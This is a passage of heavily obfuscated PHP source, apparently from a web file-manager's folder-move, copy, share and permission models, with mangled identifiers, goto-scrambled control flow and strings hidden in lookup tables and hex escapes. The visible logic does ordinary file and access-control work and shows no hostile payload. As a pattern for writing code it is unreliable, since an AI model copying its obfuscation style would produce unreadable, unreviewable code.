REPEAT_RENAME_FOLDER) { $DÒ†¼É÷Ú = $this->fileNameAuto($AÁ¤õ¦‰ó©, $DÒ†¼É÷Ú, $e•¯çà×ÛÂ, $døï¿‰Ü‚¹); $d„Ì®ÇÊ‹˜ = $this->_moveForce($fªƒ÷é ›ƒ, $AÁ¤õ¦‰ó©, $DÒ†¼É÷Ú); } else { if ($e•¯çà×ÛÂ == REPEAT_REPLACE) { $a¦‹šĞ³ì = $this->sourceInfoCache($d²çë‹Ï‡); $fè­–™‡—‚ = $this->fileHistory($a¦‹šĞ³ì, $fÕÛµÀøö†[$FÔÅçØá‚â[441]], $fÕÛµÀøö†[$FÔÅçØá‚â[77]]); if ($fè­–™‡—‚) { $A­õëÚ‘Ëì[$FÔÅçØá‚â[524]][] = $fÕÛµÀøö†[$FÔÅçØá‚â[441]]; } else { $F†·ç·ÚÃ = !0; } } } } } if ($F†·ç·ÚÃ && !$A­õëÚ‘Ëì[$FÔÅçØá‚â[555]]) { $A­õëÚ‘Ëì[$FÔÅçØá‚â[555]] = !0; } goto bÎŠ«¹ËÂ; a­¾È„ˆß©: $FÔÅçØá‚â =& $_SERVER[…ë˜õ]; $fÕÛµÀøö† = $this->sourceInfo($fªƒ÷é ›ƒ); $døï¿‰Ü‚¹ = $fÕÛµÀøö†[$FÔÅçØá‚â[397]] == $FÔÅçØá‚â[86]; goto a¢¦öã’×; eá–á¸Í†›: } private function _moveForce($cĞ¢ôµùáä, $eØÓÃ´Ù, $bù©¦ˆìœ§) { goto dİÜ¸áß…³; dİÜ¸áß…³: $c®çîÛ·¿ =& $_SERVER[…ë˜õ]; $F—…¹ŒÉ÷‘ = $this->sourceInfo($cĞ¢ôµùáä); $CÌé™ğáğò = $this->sourceInfo($eØÓÃ´Ù); goto F–î—ÌœÛ”; CŸƒê×ÃÃ®: if (!$AŠÁêóÅ § && $this->moveClearAuth) { Model($c®çîÛ·¿[476])->authClear($cĞ¢ôµùáä); } $fÄîŞÍÀ¤å = $F—…¹ŒÉ÷‘[$c®çîÛ·¿[417]] == $c®çîÛ·¿[86] && $CÌé™ğáğò[$c®çîÛ·¿[417]] != $c®çîÛ·¿[86]; if ($fÄîŞÍÀ¤å) { $Bª¢¬ì—§[$c®çîÛ·¿[416]] = 0; } goto Bˆ÷ÇÜ’„; Bˆ÷ÇÜ’„: if ($d»‘–¥£è) { $CöÚµ¢ŸÃŠ = array($c®çîÛ·¿[548] => array($c®çîÛ·¿[507], $F—…¹ŒÉ÷‘[$c®çîÛ·¿[481]] . $F—…¹ŒÉ÷‘[$c®çîÛ·¿[390]] . $c®çîÛ·¿[508])); $D¥•°ĞÛ‡ = $F—…¹ŒÉ÷‘[$c®çîÛ·¿[481]] . $F—…¹ŒÉ÷‘[$c®çîÛ·¿[390]] . $c®çîÛ·¿[47]; $a½¢°ÏŸÕæ = $CÌé™ğáğò[$c®çîÛ·¿[481]] . $CÌé™ğáğò[$c®çîÛ·¿[390]] . $c®çîÛ·¿[47] . $F—…¹ŒÉ÷‘[$c®çîÛ·¿[390]] . $c®çîÛ·¿[47]; $AÑØ©ÀèÇÔ = array($c®çîÛ·¿[548] => array($c®çîÛ·¿[556], "\x72\x65\x70\x6c\x61\x63\145\50\160\141\x72\145\x6e\x74\114\145\166\145\154\54\x27{$D¥•°ĞÛ‡}\x27\54\x27{$a½¢°ÏŸÕæ}\47\51"), $c®çîÛ·¿[544] => $CÌé™ğáğò[$c®çîÛ·¿[398]], $c®çîÛ·¿[545] => $CÌé™ğáğò[$c®çîÛ·¿[478]]); if ($fÄîŞÍÀ¤å) { $AÑØ©ÀèÇÔ[$c®çîÛ·¿[416]] = 0; } $this->where($CöÚµ¢ŸÃŠ)->data($AÑØ©ÀèÇÔ)->save(); } $this->where(array($c®çîÛ·¿[404] => $cĞ¢ôµùáä))->data($Bª¢¬ì—§)->save(); return $cĞ¢ôµùáä; goto BÛ±²º§„; F–î—ÌœÛ”: $d»‘–¥£è = $F—…¹ŒÉ÷‘[$c®çîÛ·¿[397]] == $c®çîÛ·¿[86]; $Bª¢¬ì—§ = array($c®çîÛ·¿[389] => $CÌé™ğáğò[$c®çîÛ·¿[390]], $c®çîÛ·¿[548] => $CÌé™ğáğò[$c®çîÛ·¿[481]] . $CÌé™ğáğò[$c®çîÛ·¿[390]] . $c®çîÛ·¿[47], $c®çîÛ·¿[544] => $CÌé™ğáğò[$c®çîÛ·¿[398]], $c®çîÛ·¿[545] => $CÌé™ğáğò[$c®çîÛ·¿[478]], $c®çîÛ·¿[547] => USER_ID, $c®çîÛ·¿[407] => $bù©¦ˆìœ§); $AŠÁêóÅ § = $F—…¹ŒÉ÷‘[$c®çîÛ·¿[398]] == SourceModel::TYPE_GROUP && $CÌé™ğáğò[$c®çîÛ·¿[398]] == SourceModel::TYPE_GROUP && $F—…¹ŒÉ÷‘[$c®çîÛ·¿[478]] == $CÌé™ğáğò[$c®çîÛ·¿[478]]; goto CŸƒê×ÃÃ®; BÛ±²º§„: } private function clearShare($f¾…ƒ†³œ±, $E¥¦ÕÑ‰Ò‹) { goto b“Ê®¦¾•; bğòÄˆÃÎ: if ($AŸš…‡Ÿßõ[$B¥é»ÔÇÀ[478]] == $A„˜ÚÌâİÒ[$B¥é»ÔÇÀ[478]] && $AŸš…‡Ÿßõ[$B¥é»ÔÇÀ[398]] == $B¥é»ÔÇÀ[557]) { return; } $B¤×ö­ˆ¡µ = array($B¥é»ÔÇÀ[481] => array($B¥é»ÔÇÀ[507], $AŸš…‡Ÿßõ[$B¥é»ÔÇÀ[481]] . $f¾…ƒ†³œ± . $B¥é»ÔÇÀ[508])); $eê²İçî¦– = $this->field($B¥é»ÔÇÀ[404])->where($B¤×ö­ˆ¡µ)->getField($B¥é»ÔÇÀ[390], !0); goto cÒó´ç«¹Ç; aŠ¼Œ·á: Model($B¥é»ÔÇÀ[558])->where($B¤×ö­ˆ¡µ)->save(array($B¥é»ÔÇÀ[469] => 0)); Model($B¥é»ÔÇÀ[559])->where($B¤×ö­ˆ¡µ)->delete(); goto F÷á×áâ±; F‘¼Æ½à¡Í: if (!$fÎä•Çì†¢) { return; } $fÎä•Çì†¢ = array_to_keyvalue($fÎä•Çì†¢, $B¥é»ÔÇÀ[33], $B¥é»ÔÇÀ[462]); $B¤×ö­ˆ¡µ = array($B¥é»ÔÇÀ[462] => array($B¥é»ÔÇÀ[7], $fÎä•Çì†¢)); goto aŠ¼Œ·á; b“Ê®¦¾•: $B¥é»ÔÇÀ =& $_SERVER[…ë˜õ]; $AŸš…‡Ÿßõ = $this->sourceInfo($f¾…ƒ†³œ±); $A„˜ÚÌâİÒ = $this->sourceInfo($E¥¦ÕÑ‰Ò‹); goto bğòÄˆÃÎ; cÒó´ç«¹Ç: if (!$eê²İçî¦–) { return; } $B¤×ö­ˆ¡µ = array($B¥é»ÔÇÀ[390] => array($B¥é»ÔÇÀ[7], $eê²İçî¦–), $B¥é»ÔÇÀ[469] => 1); $fÎä•Çì†¢ = Model($B¥é»ÔÇÀ[558])->field($B¥é»ÔÇÀ[462])->where($B¤×ö­ˆ¡µ)->select(); goto F‘¼Æ½à¡Í; F÷á×áâ±: } public function copyFolderFromIO($bÃš£¬§®, $c¹ƒ—ìòÖ³, $dñÚ“œî¢æ, $aÄ¸‡Ò¥¹, $b¥«Š×ù«Ù, $FÚæí°Ûó = false) { goto e½ŞªÛƒ½¤; f‡Ÿ­®¼â: if ($e”è¦«¬ã) { $this->_childrenAllMake($e”è¦«¬ã); } Hook::trigger($aÂŠËÀÅŸŞ[561]); $this->_copyChildTo($bÃš£¬§®, $c¹ƒ—ìòÖ³, $fë×ù·±Ü, $aÄ¸‡Ò¥¹, $dóé«§Ø† , $b¥«Š×ù«Ù); goto fğ‹—Œ¦¼Ò; fğ‹—Œ¦¼Ò: Hook::trigger($aÂŠËÀÅŸŞ[562]); if ($fë×ù·±Ü) { $this->folderSizeResetChildren($fë×ù·±Ü); } $this->_childrenListClear(); goto F„íÎŠ¢²¡; cÕùÅÒÅñà: $this->updateModifyTime($dñÚ“œî¢æ); return $fë×ù·±Ü; goto b‚š¶²‡î; BÄÂÕ†Œ¦º: Model($aÂŠËÀÅŸŞ[444])->linkAdd($dóé«§Ø† [$aÂŠËÀÅŸŞ[524]]); Model($aÂŠËÀÅŸŞ[444])->remove($dóé«§Ø† [$aÂŠËÀÅŸŞ[560]]); $this->folderSizeReset($dñÚ“œî¢æ); goto cÕùÅÒÅñà; dÛ‘¿ÜÌ†: $e”è¦«¬ã = $this->fileNameExist($dñÚ“œî¢æ, $døÓˆî²í«); $fë×ù·±Ü = $this->mkdir($dñÚ“œî¢æ, $døÓˆî²í«, $aÄ¸‡Ò¥¹); if (!$e”è¦«¬ã || $aÄ¸‡Ò¥¹ == REPEAT_RENAME_FOLDER) { $aÄ¸‡Ò¥¹ = !1; } goto f‡Ÿ­®¼â; F„íÎŠ¢²¡: Model($aÂŠËÀÅŸŞ[527])->addAll($dóé«§Ø† [$aÂŠËÀÅŸŞ[525]], array(), !0); Model($aÂŠËÀÅŸŞ[528])->eventCopy($fë×ù·±Ü); $this->saveAll($dóé«§Ø† [$aÂŠËÀÅŸŞ[526]]); goto BÄÂÕ†Œ¦º; e½ŞªÛƒ½¤: $aÂŠËÀÅŸŞ =& $_SERVER[…ë˜õ]; $dóé«§Ø†  = array($aÂŠËÀÅŸŞ[525] => array(), $aÂŠËÀÅŸŞ[526] => array(), $aÂŠËÀÅŸŞ[524] => array(), $aÂŠËÀÅŸŞ[560] => array()); $døÓˆî²í« = $FÚæí°Ûó ? $FÚæí°Ûó : $bÃš£¬§®->pathThis($c¹ƒ—ìòÖ³); goto dÛ‘¿ÜÌ†; b‚š¶²‡î: } private function _copyChildTo($b²øÌŸ½ã¼, $fÙ…ˆİ†çÍ, $d…„öîí Æ, $Dæ°æŸß¶·, &$Aé¼§Ëë®, $fä¡ƒĞİ) { goto FÜÄôèŒ¹; c‘Õí‚é´: if (!empty($b®ìÊ¶ëÍ)) { $this->addAll($b®ìÊ¶ëÍ); $this->_childrenListSelect($d…„öîí Æ); } $fˆ“ŒŠ÷ = $this->_childrenList($d…„öîí Æ); $fˆ“ŒŠ÷ = array_to_keyvalue($fˆ“ŒŠ÷, $BÀ˜øÕ±·[28]); goto f‡ËÙÏ„ãõ; FÜÄôèŒ¹: $BÀ˜øÕ±· =& $_SERVER[…ë˜õ]; $E÷„×Çê¿ = $this->sourceInfoCache($d…„öîí Æ); $D­É„Äø = $b²øÌŸ½ã¼->listPath($fÙ…ˆİ†çÍ); goto C¨“Ÿ¯‘óí; FÈÚÌË»™Ø: $b®ìÊ¶ëÍ = array(); foreach ($bÈ¦±áÀ”ù as &$Fˆ‹²ö˜‘‘) { goto FÔÙËÚœÁ; a¡‚œíïÎĞ: $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[77]] = _get($Fˆ‹²ö˜‘‘, $BÀ˜øÕ±·[77], 0); $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[441]] = _get($Fˆ‹²ö˜‘‘, $BÀ˜øÕ±·[441], 0); if (!isset($Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[563]]) && $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[441]]) { $Aé¼§Ëë®[$BÀ˜øÕ±·[560]][] = $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[441]]; } goto BàÜš¶“; BàÜš¶“: if ($Dæ°æŸß¶·) { $FÛ²…î³çŞ = $this->fileNameExistCache($d…„öîí Æ, $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[28]]); if ($FÛ²…î³çŞ) { if ($Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[397]] || $Dæ°æŸß¶· == REPEAT_SKIP) { continue; } if ($Dæ°æŸß¶· == REPEAT_REPLACE) { $BÅÍª¤‘ã’ = $this->sourceInfoCache($FÛ²…î³çŞ); $bÛµÖìŸ¯­ = $this->fileHistory($BÅÍª¤‘ã’, $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[441]], $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[77]]); if ($bÛµÖìŸ¯­) { $Aé¼§Ëë®[$BÀ˜øÕ±·[524]][] = $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[441]]; } continue; } else { if ($Dæ°æŸß¶· == REPEAT_RENAME) { $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[28]] = $this->fileNameAutoCache($d…„öîí Æ, $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[28]], $Dæ°æŸß¶·, !1); } } } } if (!$Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[397]] && $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[441]]) { $Aé¼§Ëë®[$BÀ˜øÕ±·[524]][] = $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[441]]; } $b®ìÊ¶ëÍ[] = $this->_makeItemData($Fˆ‹²ö˜‘‘, $E÷„×Çê¿, $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[28]]); goto EËÀ£„Ğñ¡; FÔÙËÚœÁ: if (isset($a‘—îÇÙÃí[$Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[28]]])) { $Fˆ‹²ö˜‘‘ = $a‘—îÇÙÃí[$Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[28]]]; } $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[397]] = $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[29]] == $BÀ˜øÕ±·[76]; $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[399]] = _get($Fˆ‹²ö˜‘‘, $BÀ˜øÕ±·[167], $BÀ˜øÕ±·[33]); goto a¡‚œíïÎĞ; EËÀ£„Ğñ¡: } unset($Fˆ‹²ö˜‘‘); goto c‘Õí‚é´; C¨“Ÿ¯‘óí: $D­É„Äø = $D­É„Äø ? $D­É„Äø : array($BÀ˜øÕ±·[73] => array(), $BÀ˜øÕ±·[74] => array()); $bÈ¦±áÀ”ù = array_merge($D­É„Äø[$BÀ˜øÕ±·[73]], $D­É„Äø[$BÀ˜øÕ±·[74]]); $a‘—îÇÙÃí = $this->_addFiles($b²øÌŸ½ã¼, $D­É„Äø[$BÀ˜øÕ±·[73]], $fä¡ƒĞİ); goto FÈÚÌË»™Ø; f‡ËÙÏ„ãõ: foreach ($bÈ¦±áÀ”ù as $Fˆ‹²ö˜‘‘) { $BÅÍª¤‘ã’ = $fˆ“ŒŠ÷[$Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[28]]]; $Aåğ‡¾Œ• = $BÅÍª¤‘ã’[$BÀ˜øÕ±·[390]]; $this->_copyApplyMeta($BÅÍª¤‘ã’, $Aé¼§Ëë®); if ($Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[29]] == $BÀ˜øÕ±·[76]) { $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[75]] = $b²øÌŸ½ã¼->getPathInner($Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[75]]); $this->_copyChildTo($b²øÌŸ½ã¼, $Fˆ‹²ö˜‘‘[$BÀ˜øÕ±·[75]], $Aåğ‡¾Œ•, $Dæ°æŸß¶·, $Aé¼§Ëë®, $fä¡ƒĞİ); } } goto DÅëÁà‘ôì; DÅëÁà‘ôì: } private function _addFiles($Có˜ó†çä®, $FÚ‘”«¸¾ó, $Eµ¶ÚÊîÍ) { goto eä®Æ†­‘Õ; A‰½Œì˜¿: $fï„½†¢¦é = Model($b¯ƒµ…ëÇ[566]); $aë·•¬´© = $fï„½†¢¦é->where($eâïÓÆ±ˆù)->select(); $aë·•¬´© = $aë·•¬´© ? $aë·•¬´© : array(); goto béİ®™¤àÏ; fºÛ‚Ş§›·: $aë·•¬´© = $aë·•¬´© ? $aë·•¬´© : array(); foreach ($aë·•¬´© as $eÏ¬·ÍŠ…è) { if (!isset($CõòÁ†ÙˆÓ[$eÏ¬·ÍŠ…è[$b¯ƒµ…ëÇ[169]]])) { continue; } $c¼ô²ÊóÊ =& $CõòÁ†ÙˆÓ[$eÏ¬·ÍŠ…è[$b¯ƒµ…ëÇ[169]]]; foreach ($c¼ô²ÊóÊ as &$f­ç†Êëé) { $f­ç†Êëé[$b¯ƒµ…ëÇ[441]] = $eÏ¬·ÍŠ…è[$b¯ƒµ…ëÇ[441]]; } unset($f­ç†Êëé); } $DÍ˜•áÆ”¦ = array(); goto BÆ»ŒÆ‰‚—; BÆ»ŒÆ‰‚—: foreach ($FÚ‘”«¸¾ó as $cÂ½ïÂ‘¥) { $DÍ˜•áÆ”¦[$cÂ½ïÂ‘¥[$b¯ƒµ…ëÇ[28]]] = $cÂ½ïÂ‘¥; } return $DÍ˜•áÆ”¦; goto CÊÄŠµ–Ë”; eÈÏ†çÚ“œ: $fï„½†¢¦é->addAll($Fç‘›ª ‡Î); $eâïÓÆ±ˆù = array($b¯ƒµ…ëÇ[169] => array($b¯ƒµ…ëÇ[7], array_keys($CõòÁ†ÙˆÓ))); $aë·•¬´© = $fï„½†¢¦é->where($eâïÓÆ±ˆù)->select(); goto fºÛ‚Ş§›·; Bƒïà‚Öë: foreach ($FÚ‘”«¸¾ó as &$f­ç†Êëé) { goto dÕ¨Ó¼×Ê¥; a¦Ë‰šˆœ¡: $Bòâ‚Àù‹“ = $Có˜ó†çä®->hashMd5($f­ç†Êëé[$b¯ƒµ…ëÇ[75]]); if (strlen($Bòâ‚Àù‹“) > 10 && !isset($CõòÁ†ÙˆÓ[$Bòâ‚Àù‹“])) { $CõòÁ†ÙˆÓ[$Bòâ‚Àù‹“] = array(); } $f­ç†Êëé[$b¯ƒµ…ëÇ[170]] = $B—Û²ùê“÷; goto bÚ»èêà‚; Eßºàğë‹¡: if (count($CõòÁ†ÙˆÓ[$Bòâ‚Àù‹“]) > 1) { $f­ç†Êëé[$b¯ƒµ…ëÇ[563]] = !0; } goto D¬ñ„ùÁ®Ü; dÕ¨Ó¼×Ê¥: Hook::trigger($b¯ƒµ…ëÇ[564], $f­ç†Êëé); $f­ç†Êëé[$b¯ƒµ…ëÇ[75]] = $Có˜ó†çä®->getPathInner($f­ç†Êëé[$b¯ƒµ…ëÇ[75]]); $B—Û²ùê“÷ = $Có˜ó†çä®->hashSimple($f­ç†Êëé[$b¯ƒµ…ëÇ[75]]); goto a¦Ë‰šˆœ¡; bÚ»èêà‚: $f­ç†Êëé[$b¯ƒµ…ëÇ[169]] = $Bòâ‚Àù‹“; Hook::trigger($b¯ƒµ…ëÇ[565], $f­ç†Êëé); $CõòÁ†ÙˆÓ[$Bòâ‚Àù‹“][] =& $f­ç†Êëé; goto Eßºàğë‹¡; D¬ñ„ùÁ®Ü: } unset($f­ç†Êëé); $eâïÓÆ±ˆù = array($b¯ƒµ…ëÇ[169] => array($b¯ƒµ…ëÇ[7], array_keys($CõòÁ†ÙˆÓ))); goto A‰½Œì˜¿; eä®Æ†­‘Õ: $b¯ƒµ…ëÇ =& $_SERVER[…ë˜õ]; if (!$FÚ‘”«¸¾ó || count($FÚ‘”«¸¾ó) == 0) { return array(); } $CõòÁ†ÙˆÓ = array(); goto Bƒïà‚Öë; béİ®™¤àÏ: foreach ($aë·•¬´© as $eÏ¬·ÍŠ…è) { if (!isset($CõòÁ†ÙˆÓ[$eÏ¬·ÍŠ…è[$b¯ƒµ…ëÇ[169]]])) { continue; } $bÙ•óóÄÅö = $CõòÁ†ÙˆÓ[$eÏ¬·ÍŠ…è[$b¯ƒµ…ëÇ[169]]]; foreach ($bÙ•óóÄÅö as &$f­ç†Êëé) { $f­ç†Êëé[$b¯ƒµ…ëÇ[441]] = $eÏ¬·ÍŠ…è[$b¯ƒµ…ëÇ[441]]; $f­ç†Êëé[$b¯ƒµ…ëÇ[563]] = !0; } unset($f­ç†Êëé); } $Fç‘›ª ‡Î = array(); foreach ($FÚ‘”«¸¾ó as $BóêÓ³¬») { if (isset($BóêÓ³¬»[$b¯ƒµ…ëÇ[563]]) && $BóêÓ³¬»[$b¯ƒµ…ëÇ[563]]) { continue; } $BÊïˆ¯¡„ = $Có˜ó†çä®->getPathInner($BóêÓ³¬»[$b¯ƒµ…ëÇ[75]]); $bùÏ¬ó´ˆ = $fï„½†¢¦é->addFileMake($BÊïˆ¯¡„, $BóêÓ³¬»[$b¯ƒµ…ëÇ[77]], $BóêÓ³¬»[$b¯ƒµ…ëÇ[170]], $BóêÓ³¬»[$b¯ƒµ…ëÇ[169]], $BóêÓ³¬»[$b¯ƒµ…ëÇ[28]], $Eµ¶ÚÊîÍ); $Fç‘›ª ‡Î[] = $bùÏ¬ó´ˆ; } goto eÈÏ†çÚ“œ; CÊÄŠµ–Ë”: } } define($_SERVER[…ë˜õ][567], $_SERVER[…ë˜õ][568]); goto fÊì¡ë«Àø; C½ÄËêíƒ: class SourceAuthModel extends ModelBase { protected $tableName = "\151\157\137\x73\157\165\x72\143\x65\x5f\x61\165\x74\x68"; public function getAuth($e˜¨æÕí—´) { goto B¥‰‚‹İÚ¸; B¥‰‚‹İÚ¸: $DÏò‚Õ¿Òò =& $_SERVER[…ë˜õ]; $CÄ÷—”ôçÜ = $this->sourceAuthSelect($e˜¨æÕí—´); $A÷ÔëùÉà = array(); goto DÓÄØ¥„²‚; EÑ´ïØö‹›: array_multisort($aˆ±œ–ÌŞ›, SORT_DESC, $A÷ÔëùÉà); return $A÷ÔëùÉà; goto DŸÃÓÅˆµŞ; DÓÄØ¥„²‚: $aˆ±œ–ÌŞ› = array(); $EÚÉŒ£´Á• = 2 << 25; foreach ($CÄ÷—”ôçÜ as $eÏ«Ş—õÀ) { goto AÁ²íéÍ¥; D÷±•±ÀÒ—: if ($eÏ«Ş—õÀ[$DÏò‚Õ¿Òò[398]] == SourceModel::TYPE_USER && $eÏ«Ş—õÀ[$DÏò‚Õ¿Òò[478]] == $DÏò‚Õ¿Òò[491]) { $bµ¶•Èµ‹˜ = 0; } $aˆ±œ–ÌŞ›[] = $Eáë»Çî¢£[$DÏò‚Õ¿Òò[400]] + $bµ¶•Èµ‹˜; goto a„×òÅğ; EÚîÅ›”¯Ó: $bµ¶•Èµ‹˜ = 0; if ($eÏ«Ş—õÀ[$DÏò‚Õ¿Òò[398]] == SourceModel::TYPE_GROUP) { $bµ¶•Èµ‹˜ = $EÚÉŒ£´Á• * 2; } if ($eÏ«Ş—õÀ[$DÏò‚Õ¿Òò[398]] == SourceModel::TYPE_USER) { $bµ¶•Èµ‹˜ = $EÚÉŒ£´Á•; } goto D÷±•±ÀÒ—; AÁ²íéÍ¥: $Eáë»Çî¢£ = Model($DÏò‚Õ¿Òò[1863])->listData($eÏ«Ş—õÀ[$DÏò‚Õ¿Òò[1791]]); if (!$Eáë»Çî¢£) { continue; } $A÷ÔëùÉà[] = $eÏ«Ş—õÀ; goto EÚîÅ›”¯Ó; a„×òÅğ: } goto EÑ´ïØö‹›; DŸÃÓÅˆµŞ: } public function sourceAuthSelect($aÔ©¥ŠõƒŸ) { goto C¥õ¬¡ç×ç; aí‘¨­Ë›: if ($A–°±‹ëí) { $aÔ©¥ŠõƒŸ = array($aÔ©¥ŠõƒŸ); } $AİŸËÒ“‡¹ = array(); foreach ($aÔ©¥ŠõƒŸ as $CíÙ¹Ÿ¯‚˜) { if (isset($b²‰œ ÀÖÍ[$CíÙ¹Ÿ¯‚˜])) { $AİŸËÒ“‡¹[$CíÙ¹Ÿ¯‚˜] = $b²‰œ ÀÖÍ[$CíÙ¹Ÿ¯‚˜]; } } goto bõ¢ª»ƒ„»; C¥õ¬¡ç×ç: $B©ù‚î°ˆï =& $_SERVER[…ë˜õ]; static $b²‰œ ÀÖÍ = array(); $A–°±‹ëí = is_array($aÔ©¥ŠõƒŸ) ? !1 : !0; goto aí‘¨­Ë›; e©‰ñ†±ìÅ: $AÒºçÃóëÎ = $this->field($B¿×Ù¤ƒÒÑ)->order($B©ù‚î°ˆï[388])->where($cìªÑ´‡×ó)->select(); $aêÈÒƒİ…ñ = array_to_keyvalue_group($AÒºçÃóëÎ, $B©ù‚î°ˆï[390]); foreach ($aÔ©¥ŠõƒŸ as $CíÙ¹Ÿ¯‚˜) { $b²‰œ ÀÖÍ[$CíÙ¹Ÿ¯‚˜] = $aêÈÒƒİ…ñ[$CíÙ¹Ÿ¯‚˜] ? $aêÈÒƒİ…ñ[$CíÙ¹Ÿ¯‚˜] : array(); } goto fçµŞ†ø‰˜; fçµŞ†ø‰˜: if ($A–°±‹ëí) { return $AÒºçÃóëÎ; } return $aêÈÒƒİ…ñ; goto cªŒâœ–Ø„; bõ¢ª»ƒ„»: if (count($AİŸËÒ“‡¹) == count($aÔ©¥ŠõƒŸ)) { return $A–°±‹ëí ? $AİŸËÒ“‡¹[$aÔ©¥ŠõƒŸ[0]] : $AİŸËÒ“‡¹; } $B¿×Ù¤ƒÒÑ = $B©ù‚î°ˆï[1864]; $cìªÑ´‡×ó = array($B©ù‚î°ˆï[390] => array($B©ù‚î°ˆï[7], $aÔ©¥ŠõƒŸ)); goto e©‰ñ†±ìÅ; cªŒâœ–Ø„: } public function setAuth($FºÚé„à´, $C™‹ÁÌÙÙê) { goto F¶İñÇ®ìà; Cºğ¾Ü¿Ìğ: if ($CÆéÚ³èµã != $FÍŠÅ‘À‚±) { $AÈÍ†Ë£Ü = array($FÕƒ“ÃÔª¸[1694] => $CÆéÚ³èµã); $cÙ¼àî°Şâ = Model($FÕƒ“ÃÔª¸[1777])->field($FÕƒ“ÃÔª¸[1531])->where($AÈÍ†Ë£Ü)->select(); $cÙ¼àî°Şâ = array_to_keyvalue($cÙ¼àî°Şâ, $FÕƒ“ÃÔª¸[33], $FÕƒ“ÃÔª¸[1531]); } $c®Ï˜ÀªÕ• = array(SourceModel::TYPE_GROUP, SourceModel::TYPE_USER); $e¿ë¬ÓÄ = array(); goto B£ò—„±¦„; B£ò—„±¦„: foreach ($C™‹ÁÌÙÙê as $b ´¤“Áî) { if (!in_array($b ´¤“Áî[$FÕƒ“ÃÔª¸[398]], $c®Ï˜ÀªÕ•)) { show_json(LNG($FÕƒ“ÃÔª¸[1865]), !1); } if ($CÆéÚ³èµã != $FÍŠÅ‘À‚±) { if ($b ´¤“Áî[$FÕƒ“ÃÔª¸[398]] == SourceModel::TYPE_GROUP) { } if ($b ´¤“Áî[$FÕƒ“ÃÔª¸[478]] != 0 && !in_array($b ´¤“Áî[$FÕƒ“ÃÔª¸[478]], $cÙ¼àî°Şâ)) { } } if ($b ´¤“Áî[$FÕƒ“ÃÔª¸[478]] == 0) { $b ´¤“Áî[$FÕƒ“ÃÔª¸[398]] = SourceModel::TYPE_USER; } $e¿ë¬ÓÄ[] = array($FÕƒ“ÃÔª¸[390] => $FºÚé„à´, $FÕƒ“ÃÔª¸[398] => intval($b ´¤“Áî[$FÕƒ“ÃÔª¸[398]]), $FÕƒ“ÃÔª¸[478] => intval($b ´¤“Áî[$FÕƒ“ÃÔª¸[478]]), $FÕƒ“ÃÔª¸[1791] => intval($b ´¤“Áî[$FÕƒ“ÃÔª¸[1791]]) ? intval($b ´¤“Áî[$FÕƒ“ÃÔª¸[1791]]) : 0, $FÕƒ“ÃÔª¸[1845] => intval($b ´¤“Áî[$FÕƒ“ÃÔª¸[1845]]) ? intval($b ´¤“Áî[$FÕƒ“ÃÔª¸[1845]]) : -1); } $this->where(array($FÕƒ“ÃÔª¸[404] => $FºÚé„à´))->delete(); $this->addAll($e¿ë¬ÓÄ); goto d¤Â²öøï; DÊÕ¼É…Áø: if ($aìŒğõÓÚ‘[$FÕƒ“ÃÔª¸[398]] != SourceModel::TYPE_GROUP) { return !1; } $FÍŠÅ‘À‚± = 1; $CÆéÚ³èµã = $aìŒğõÓÚ‘[$FÕƒ“ÃÔª¸[478]]; goto Cºğ¾Ü¿Ìğ; F¶İñÇ®ìà: $FÕƒ“ÃÔª¸ =& $_SERVER[…ë˜õ]; $aìŒğõÓÚ‘ = Model($FÕƒ“ÃÔª¸[1209])->sourceInfo($FºÚé„à´); if (!$aìŒğõÓÚ‘) { return !1; } goto DÊÕ¼É…Áø; d¤Â²öøï: return !0; goto FÇÁŠó½ ‰; FÇÁŠó½ ‰: } public function authClear($BÚ¦°ˆ¦÷Ì) { $Cƒ‹áñ” =& $_SERVER[…ë˜õ]; $eí‚²ñ—· = Model($Cƒ‹áñ”[1209])->sourceInfo($BÚ¦°ˆ¦÷Ì); $BÁ¤ˆêÇœÒ = array($BÚ¦°ˆ¦÷Ì); if ($eí‚²ñ—·[$Cƒ‹áñ”[397]] == $Cƒ‹áñ”[86]) { $c¿Ü«•‡¹¶ = array($Cƒ‹áñ”[548] => array($Cƒ‹áñ”[507], $eí‚²ñ—·[$Cƒ‹áñ”[481]] . $BÚ¦°ˆ¦÷Ì . $Cƒ‹áñ”[508])); $BÁ¤ˆêÇœÒ = Model($Cƒ‹áñ”[1209])->field($Cƒ‹áñ”[404])->where($c¿Ü«•‡¹¶)->getField($Cƒ‹áñ”[390], !0); $BÁ¤ˆêÇœÒ[] = $BÚ¦°ˆ¦÷Ì; } $this->where(array($Cƒ‹áñ”[404] => array($Cƒ‹áñ”[405], $BÁ¤ˆêÇœÒ)))->delete(); return !0; } public function getAllChildren($f†³¯÷§—ğ) { goto EŞ¡†«ãô°; F Ş¬Õ§Ü‰: return $this->sourceListAuth($F¢Øª©‘æ); goto B·éÉ©…ô¦; EŞ¡†«ãô°: $cè’Åî¬êÄ =& $_SERVER[…ë˜õ]; $cğ¶ƒòÌù = Model($cè’Åî¬êÄ[1209])->sourceInfo($f†³¯÷§—ğ); if ($cğ¶ƒòÌù[$cè’Åî¬êÄ[397]] != $cè’Åî¬êÄ[86]) { return 